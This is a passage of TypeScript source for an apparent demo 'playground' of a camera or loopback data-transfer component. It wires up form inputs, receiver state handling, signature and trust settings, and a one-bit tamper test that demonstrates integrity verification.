        } else preview = `<div class="stat">${bytes.length} bytes of ${esc(art.mediaType)}</div>`;
        box.innerHTML = `<div class="viz-t">payload <span class="stat">${esc(art.mediaType)} · ${bytes.length} B${art.compression && art.compression !== 'none' ? ` · ${art.compression}` : ''}</span>
          <a class="btn mini" href="${payloadUrl}" download="${esc(name)}">save</a></div>${preview}`;
      } catch (e) {
        box.innerHTML = `<pre class="code err">${esc(String(e))}</pre>`;
      }
    }

    function onTerminal() {
      renderStats();
      renderVerdict();
      const art = receiver.artifact;
      if (!art) return;
      const s = receiver.state;
      if (s === 'unknown-sender') { $('.decision').innerHTML = ''; return; }
      renderDecision(art.uiProposal, art.uiProposal && s !== 'rejected' ? receiver.uiDecision : null);
      if (receiver.verification?.valid) void renderPayload(art);
      else $('.payload').innerHTML = '';
    }

    on(receiver, 'oat-state-change', (e) => {
      const s = (e as CustomEvent).detail.state as string;
      $('.r-state').textContent = s;
      if (['accepted', 'ui-proposed', 'downgraded', 'rejected', 'unknown-sender', 'unsafe-proposed', 'awaiting-consent'].includes(s)) onTerminal();
      if (s === 'error') {
        const d = (e as CustomEvent).detail.error as string | undefined;
        if (st.mode === 'camera') showCamErr(d ?? 'camera error');
      }
    });
    on(receiver, 'oat-frame', () => { if (st.mode === 'camera') renderStats(); });

    // delegated buttons inside the verdict area
    on($('.verdict'), 'click', (e) => {
      const t = e.target as HTMLElement;
      if (t.closest('.r-trustgo')) receiver.trustSenderAndContinue();
      else if (t.closest('.r-trustno')) receiver.rejectUnknownSender();
      else if (t.closest('.r-grant')) {
        const cap = (t.closest('.r-grant') as HTMLElement).dataset.cap!;
        const d = receiver.approveCapabilities([cap]);
        renderDecision(receiver.artifact?.uiProposal, d ?? lastDecision);
      } else if (t.closest('.r-reset')) resetReceiver();
      else if (t.closest('.r-tamper')) tamperTest();
    });

    function tamperTest() {
      const art = receiver.artifact;
      const box = $('.decision');
      if (!art || !mirror?.isComplete) { box.insertAdjacentHTML('afterbegin', '<div class="dec down">receive an artifact first, then tamper with it</div>'); return; }
      // Re-assemble our own copy from the mirror decoder, flip one payload byte, re-verify.
      const copy = assembleArtifact(mirror.reconstruct())!;
      copy.payload = copy.payload.slice();
      copy.payload[0] ^= 0x01;
      const v = verifyReceivedArtifact(copy, { requireSignature: st.reqsig });
      box.insertAdjacentHTML('afterbegin', `<div class="dec reject"><b>tampered copy</b> (1 bit flipped in payload[0]) → digest ${v.digestValid ? '✓' : '✗'} · signature ${v.signatureValid === true ? '✓' : v.signatureValid === 'absent' ? '–' : '✗'} · ${v.reasons.map((r) => `<span class="chip bad">${esc(r)}</span>`).join(' ')}</div>`);
    }

    /* --------------------------------------------------------------- camera */
    function showCamErr(msg: string) {
      const el = $('.r-camerr');
      el.hidden = false;
      el.textContent = `Camera unavailable: ${msg}. Loopback mode still demonstrates the full pipeline without one.`;
    }
    on($('.r-camstart'), 'click', async () => {
      $('.r-camerr').hidden = true;
      if (!navigator.mediaDevices?.getUserMedia) { showCamErr('getUserMedia is not supported here (needs HTTPS or localhost)'); return; }
      resetReceiver();
      await receiver.start();
    });

    /* --------------------------------------------------------------- inputs */
    const edit = (patch: Partial<State>, reprep = true) => {
      Object.assign(st, patch);
      syncForm();
      save();
      if (reprep) schedulePrepare();
    };
    on(fName, 'input', () => edit({ name: fName.value }));
    on(fText, 'input', () => edit({ text: fText.value }));
    on(fHtml, 'input', () => edit({ html: fHtml.value }));
    on(fFallback, 'input', () => edit({ fallback: fFallback.value }));
    on(fUi, 'change', () => edit({ ui: fUi.value as UiMode }));
    on(fSign, 'change', () => { edit({ sign: fSign.checked }); applyReceiverPolicy(); });
    on(fBlock, 'input', () => edit({ block: Number(fBlock.value) }));
    on(fGzip, 'change', () => edit({ gzip: fGzip.checked }));
    on(fEcc, 'change', () => edit({ ecc: fEcc.value }, false)); // read by the element on every tick
    on(fFps, 'input', () => {
      edit({ fps: Number(fFps.value) }, false);
      sender.setAttribute('frame-rate', String(st.fps));
      if (sender.state === 'transmitting') { sender.pause(); sender.start(); }
    });
    on(fDrop, 'input', () => edit({ drop: Number(fDrop.value) }, false));
    on(fReorder, 'change', () => edit({ reorder: fReorder.checked }, false));
    on(fTrust, 'change', () => { edit({ trust: fTrust.value as Trust }, false); applyReceiverPolicy(); resetReceiver(); });
    on(fReqsig, 'change', () => { edit({ reqsig: fReqsig.checked }, false); applyReceiverPolicy(); resetReceiver(); });
    on($('.f-kind'), 'click', (e) => {
      const b = (e.target as HTMLElement).closest('button');
      if (b) edit({ kind: b.dataset.k as Kind });
    });
    on($('.r-mode'), 'click', (e) => {
      const b = (e.target as HTMLElement).closest('button');
      if (!b) return;
      edit({ mode: b.dataset.m! }, false);
      if (st.mode === 'loopback') receiver.stop();
      resetReceiver();
    });
    on($('.f-file'), 'change', () => {
      file = $<HTMLInputElement>('.f-file').files?.[0] ?? null;
      $('.f-fileinfo').textContent = file ? `${file.name} · ${file.type || 'application/octet-stream'} · ${file.size} B` : 'no file';
      if (file) edit({ name: file.name });
      else schedulePrepare();
    });
    on($('.f-rekey'), 'click', () => {
      keys = generateSigningKey();
      applyReceiverPolicy();
      edit({});
    });
    on($('.s-toggle'), 'click', () => sender.toggle());
    on($('.oat-preset'), 'change', () => {
      const sel = $<HTMLSelectElement>('.oat-preset');
      const p = PRESETS[sel.value];
      sel.value = '';
      if (p) edit({ ...p });
    });
    on($('.f-link'), 'click', async () => {
      await copyLink();
      $('.f-linkmsg').textContent = 'link copied';
      setTimeout(() => { $('.f-linkmsg').textContent = ''; }, 1500);
    });

    syncForm();
    applyReceiverPolicy();
    void prepare();

    return () => {
      clearTimeout(prepTimer);
      disposers.forEach((d) => d());
      try { sender.stop(); } catch {}
      try { receiver.stop(); } catch {}
      if (payloadUrl) URL.revokeObjectURL(payloadUrl);
      root.remove();
    };
  },
};

export default playground;
